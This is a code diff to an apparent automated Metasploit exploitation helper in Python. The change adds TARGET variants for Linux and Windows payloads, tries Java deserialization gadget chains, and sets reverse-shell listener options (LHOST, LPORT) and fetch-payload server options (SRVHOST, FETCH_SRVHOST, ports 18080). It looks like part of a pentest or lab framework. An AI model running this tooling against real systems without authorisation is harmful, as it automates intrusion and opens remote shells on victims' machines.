@@ -63,7 +63,7 @@ def run_metasploit_module(
     payloads = payload_attempts(plan) if action == "exploit" else [plan.get("selected_payload", "")]
     final: dict[str, Any] | None = None
     for selected_payload in payloads:
-        for variant_options in option_variants(plan, options):
+        for variant_options in option_variants(plan, options, selected_payload):
             attempt_options = dict(variant_options)
             if action == "exploit":
                 attempt_options = {**attempt_options, **exploit_payload_options(target, selected_payload)}
@@ -204,7 +204,7 @@ def payload_attempts(plan: dict[str, Any]) -> list[str]:
     return payloads[:4] or [""]
 
 
-def option_variants(plan: dict[str, Any], options: dict[str, str]) -> list[dict[str, str]]:
+def option_variants(plan: dict[str, Any], options: dict[str, str], selected_payload: str = "") -> list[dict[str, str]]:
     variants = [dict(options)]
     text = " ".join(str(plan.get(key, "")) for key in ["module_path", "module_id"]).lower()
     if any(term in text for term in ["deserialize", "deserial", "shiro"]):
@@ -212,6 +212,15 @@ def option_variants(plan: dict[str, Any], options: dict[str, str]) -> list[dict[
             variant = {**options, "JAVA_GADGET_CHAIN": chain}
             if variant not in variants:
                 variants.append(variant)
+    if selected_payload.startswith("cmd/linux/") or "/linux/" in selected_payload or "linux" in text:
+        for target_id in ["1", "2"]:
+            variant = {**options, "TARGET": target_id}
+            if variant not in variants:
+                variants.append(variant)
+    if selected_payload.startswith("cmd/windows/") or "/windows/" in selected_payload:
+        variant = {**options, "TARGET": "0"}
+        if variant not in variants:
+            variants.append(variant)
     return variants[:4]
 
 
@@ -242,11 +251,17 @@ def summarize_attempt(attempt: dict[str, Any]) -> dict[str, Any]:
 
 def exploit_payload_options(target: str, payload: str) -> dict[str, str]:
     options: dict[str, str] = {}
+    lhost = infer_lhost(target)
     if "reverse" in payload:
-        lhost = infer_lhost(target)
         if lhost:
             options["LHOST"] = lhost
         options["LPORT"] = "4445"
+    if "/http/" in payload or "/https/" in payload:
+        if lhost:
+            options["SRVHOST"] = lhost
+            options["FETCH_SRVHOST"] = lhost
+        options["SRVPORT"] = "18080"
+        options["FETCH_SRVPORT"] = "18080"
     return options
 
 
